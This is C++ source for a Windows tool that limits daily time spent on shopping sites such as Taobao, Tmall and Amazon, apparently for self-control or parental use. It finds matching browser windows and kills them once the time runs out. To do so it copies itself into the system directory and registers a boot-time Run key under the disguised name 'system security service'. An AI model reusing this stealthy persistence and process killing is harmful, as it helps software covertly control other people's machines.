// WebKiller.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"

// 写入注册表更改开机启动
string WriteRegistry()
{
	char sysPath[MAX_PATH]={0}; // 系统路径
	char filePath[MAX_PATH]; // 运行的文件的完整路径
	HMODULE modH = GetModuleHandle(NULL);
	GetModuleFileName(modH, filePath, sizeof(filePath)); // 得到当前执行文件的全路径

	strcpy_s(sysPath, SYSTEM_PATH); //得到系统目录的路径
	strcat_s(sysPath, "\\"); //形成要复制到的全路径
	strcat_s(sysPath, NEW_FILE);
	char tmpCh[MAX_PATH];
	strcpy_s(tmpCh, sysPath);
	size_t i; // 转化为小写比较
	for (i = 0; i < strlen(filePath); ++i)
	{
		filePath[i] = tolower(filePath[i]);
	}
	for (i = 0; i < strlen(tmpCh); ++i)
	{
		tmpCh[i] = tolower(tmpCh[i]);
	}
	// 如果不是自己在运行
	if (strcmp(filePath, tmpCh) != 0)
	{
		sprintf_s(tmpCh, "taskkill /f /im %s", NEW_FILE);
		system(tmpCh); // 结束之前运行的程序
		CopyFile(filePath, sysPath, false);//自我复制到目标路径并覆盖存在文件

		HKEY hKey; // 写入到注册表，以便开机自动运行
		// 打开注册表：路径如下HEKY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
		RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
		// 新增一个值，名称随意命名，值为要开机运行的文件的完整路径
		RegSetValueEx(hKey, "系统安全服务", 0, REG_SZ, (const unsigned char*)sysPath, sizeof(sysPath));
		RegCloseKey(hKey); // 关闭注册表

		ShellExecute(NULL,"open", sysPath, NULL, NULL, SW_SHOWNORMAL);
		//system(sysPath);
		//WinExec(sysPath, SW_SHOWNORMAL);
		return "exit";
	}
	else
	{
		_tcsrchr(sysPath, _T('\\'))[0] = 0;
		return sysPath; // 返回运行的路径
	}
}

// 获取当前鼠标位置的窗口句柄
HWND GetCursorHwnd()
{
	POINT curPos = {0, 0};
	// 获取鼠标当前位置
	if (GetCursorPos(&curPos))
	{
		// 获取鼠标所在窗口的句柄
		return WindowFromPoint(curPos);
	}
	return NULL;
}

// 获取父窗口句柄
HWND GetParentHwnd(HWND hchild)
{
	return ::GetParent(hchild);
}

string GetWindowTitle(HWND hwnd)
{
	TCHAR szWindowTitle[100];
	//获取窗口标题
	::GetWindowTextA(hwnd, szWindowTitle, sizeof(szWindowTitle));
	return string(szWindowTitle);
}

// 模糊比较
bool FuzzyCompare(string title, string str)
{
	if (title.find(str) != string::npos)
	{
		return true;
	}
	return false;
}

// 设置目标字符串列表
void SetTargetList(vector<string>& targets, string path)
{
	ifstream input; // 输入文件
	input.open(path, ios::in);
	if (!input)
	{ // 淘宝 天猫 团购 秒杀 商城
		cout<<"no targetlist.dat"<<endl;
		targets.push_back("淘宝");
		targets.push_back("天猫");
		targets.push_back("团购");
		targets.push_back("商城");
		targets.push_back("正品");
		targets.push_back("亚马逊");
		//targets.push_back("秒杀");
		//targets.push_back("女装");
		//targets.push_back("网购");
		//targets.push_back("购物");
		//targets.push_back("唯品");
		//targets.push_back("兰缪");
		//targets.push_back("麦包包");
		//targets.push_back("优惠");
		//targets.push_back("折扣");
		//targets.push_back("包邮");
		//targets.push_back("特卖");
		//targets.push_back("特惠");
		//targets.push_back("交易");
		//targets.push_back("男装");
		//targets.push_back("凡客");
		//targets.push_back("银泰");
		return;
	}
	// 输入目标字符串
	copy(istream_iterator<string>(input), istream_iterator<string>(), back_inserter(targets));
	input.close();
}

// 关闭窗口，终结目标
void TerminateTarget(HWND hwnd)
{
	// 发送退出命令
	SendMessage(hwnd, WM_CLOSE, 0, 0);
	DestroyWindow(hwnd);
	PostMessage(hwnd, WM_QUIT, 0, 0);
	Sleep(1000); // 等待时间1秒
	// 强制结束进程
	DWORD dwProcId = 0;
	if (GetWindowThreadProcessId(hwnd, &dwProcId))  
	{
		HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcId);
		if (hProc != NULL)
		{          
			TerminateProcess(hProc, 0);
			CloseHandle(hProc); 
		}
	}
}

// 按时间终结目标
HWND FindTarget(vector<string> targets, vector<string> clsnames)
{
	string title;
	HWND hwnd;
	// 遍历目标列表
	for (vector<string>::iterator it = targets.begin(); it != targets.end(); ++it)
	{
		hwnd = GetCursorHwnd(); // 当鼠标在窗口标题上
		title = GetWindowTitle(hwnd);
		if ( FuzzyCompare(title, *it))
		{
			return hwnd;
		}
		else
		{
			if (!hwnd)
			{
				continue;
			}
			hwnd = GetParentHwnd(hwnd);// 当鼠标在窗口内
			title = GetWindowTitle(hwnd);
			if (FuzzyCompare(title, *it) )
			{
				return hwnd;
			}
		}
		for (vector<string>::iterator its = clsnames.begin(); its != clsnames.end(); ++its)
		{
			hwnd = FindWindow((*its).c_str(), NULL);
			if (!hwnd)
			{
				continue;
			}
			title = GetWindowTitle(hwnd);
			if (FuzzyCompare(title, *it))
			{
				return hwnd;
			}
		}
	}
	return NULL;
}

void SetClsName(vector<string>& clsnames, string path)
{// IE窗口/世界之窗等单独处理 IEFrame TheWorld_Frame SE_SogouExplorerFrame
	ifstream input;
	input.open(path, ios::in);
	if (!input)
	{
		cout<<"no clsname.dat"<<endl;
		clsnames.push_back("IEFrame");
		clsnames.push_back("TheWorld_Frame");
		clsnames.push_back("SE_SogouExplorerFrame");
		return;
	}
	// 输入字符串
	copy(istream_iterator<string>(input), istream_iterator<string>(), back_inserter(clsnames));
	input.close();
}

struct TickClock
{
	int year; // 年月日
	int month;
	int day;
	int hour;
	int minute;
	int second;
	int clockSec; // 计时器，以秒为单位
	string path; // 文件路径
	TickClock()
	{
		year = 1900;
		month = 1;
		day = 1;
		hour = 0;
		minute = 0;
		second = 0;
		clockSec = 0;
		path = TICK_PATH;
	}
	// 新的一天需要更新日期和时间
	void UpdateDateTime()
	{
		// 修改为当前时间
		SYSTEMTIME st = {0};
		GetLocalTime(&st);
		year = st.wYear;
		month = st.wMonth;
		day = st.wDay;
		hour = st.wHour;
		minute = st.wMinute;
		second = st.wSecond;
	}

	// 保存Tick状态
	void WriteToFile()
	{
		ofstream output;
		output.open(path, ios::out);
		if (!output)
		{
			cout<<"no tickclock.ini"<<endl;
			return;
		}
		output<<year<<"-"<<month<<"-"<<day<<" "
			<<hour<<":"<<minute<<":"<<second<<" "
			<<clockSec<<endl;
		output.close();
	}
	// 读取Tick状态
	void ReadFromFile()
	{
		ifstream input;
		input.open(path, ios::in);
		if (!input)
		{
			cout<<"no tickclock.ini"<<endl;
			return;
		}
		char ch;
		input>>year>>ch>>month>>ch>>day
			>>hour>>ch>>minute>>ch>>second
			>>clockSec;
		input.close();
	}
	// 判断时间线 1未来，0现在，-1过去
	int TimeLine()
	{
		// 获取当前时间
		//time_t now = time(NULL);
		//tm fmt;
		//localtime_s(&fmt, &now);
		SYSTEMTIME st = {0};
		GetLocalTime(&st);
		if (st.wYear == year && st.wMonth == month && st.wDay == day)
		{
			return 0; // 停留在当下
		}
		else // 未来或过去
		{
			int monCur = st.wYear*12+st.wMonth; // 实际的总月数
			int monTic = year*12+month; // 获取的的总月数
			if (monCur ==  monTic)
			{
				if (st.wDay > day)
				{
					return 1;// 表示已经到了未来了
				}
				else
				{
					return -1;
				}
			}
			else if (monCur > monTic)
			{
				return 1;
			}
			else
			{
				return -1;// 回到了过去
			}
		}
	}
};TickClock gTick;

// 提示语
void RemindNotify(string tip)
{
	// 获取桌面路径
	TCHAR deskPath[MAX_PATH];
	SHGetSpecialFolderPath(0,deskPath,CSIDL_DESKTOPDIRECTORY,0); 
	strcat_s(deskPath, "\\请删除.txt");
	// 写入记事本后打开
	ofstream output;
	output.open(deskPath, ios::out);
	if (!output)
	{
		cout<<"no remind.txt"<<endl;
		return;
	}
	output<<tip<<endl;
	output.close();
	//TCHAR filePath[MAX_PATH];
	//sprintf_s(filePath, "Notepad.exe %s", deskPath);
	//WinExec(filePath, SW_SHOWMAXIMIZED);
	ShellExecute(NULL,"open",deskPath,NULL,NULL,SW_SHOWMAXIMIZED); 
}

bool IsTickOff()
{
	int tline = gTick.TimeLine();// 判断日期在哪个时间位置上
	if (tline == 1) // 到了未来
	{
		gTick.UpdateDateTime(); // 新的一天更新日期和时间
		gTick.clockSec = INIT_SEC; // 初始化计时器
		gTick.WriteToFile(); // 写入文件
	}
	else if(tline == -1 && gTick.clockSec != 0) // 回到了过去
	{
		gTick.clockSec = 0; // 置零
		gTick.WriteToFile();
	}
	if(gTick.clockSec > 0) // 时间还未用完
	{
		--gTick.clockSec; // 时间减少
		if (gTick.clockSec == REMINDING || gTick.clockSec == 0)
		{
			char tip[MAX_PATH] = {0};
			SYSTEMTIME st = {0};
			GetLocalTime(&st);
			if (gTick.clockSec == 0)
			{
				sprintf_s(tip, "%d-%d-%d %d:%d:%d\n\n亲，您今天的网购时间已用完，要好好学习，天天向上哦！\n\n注意：请自行关闭并删除位于桌面的该文件！",
					st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
				gTick.UpdateDateTime();
				gTick.WriteToFile();
				return true;
			}
			else
			{
				sprintf_s(tip, "%d-%d-%d %d:%d:%d\n\n亲，您的网购剩余时间已不足%d分钟，请尽快保存您的状态！\n\n注意：请自行关闭并删除位于桌面的该文件！",
					st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond, REMINDING/60);
			}
			RemindNotify(tip); // 状态提醒
		}
		return false;
	}
	return true; // 时间用完了<= 0
}

int main(int argc, _TCHAR* argv[])
{
	string path = WriteRegistry(); // 写入开始运行并判断路径
 	if (path == "exit")
 	{
 		return 0; // 程序结束
 	}
	vector<string> targetList; // 目标字符串列表
	vector<string> clsnames; // 特殊窗口的类名
	SetTargetList(targetList, TARGET_PATH); // 设置目标字符串列表
	SetClsName(clsnames, CLSNAME_PATH); // 设置单独处理的句柄
	gTick.ReadFromFile();// 读入时间状态
	HWND hwnd = NULL;
	bool writeFlag = false;
	int cntSec = 0;
	while(true)
	{
		hwnd = FindTarget(targetList, clsnames); // 检测目标
		if (hwnd) // 如果目标存在,并且时间用完
		{
			if (IsTickOff())
			{
				TerminateTarget(hwnd); // 终结目标
				writeFlag = false;
			}
			else
			{
				writeFlag = true; // 要写入文件了
			}
		}
		if (++cntSec == SAVE_FREQ)
		{
			cntSec = 0;
			if (writeFlag)
			{
				writeFlag = false;
				gTick.UpdateDateTime(); // 更新时间
				gTick.WriteToFile(); // 写入文件保存状态
			}
		}
		Sleep(1000); // 每秒监测一次
	}
	return 0;
}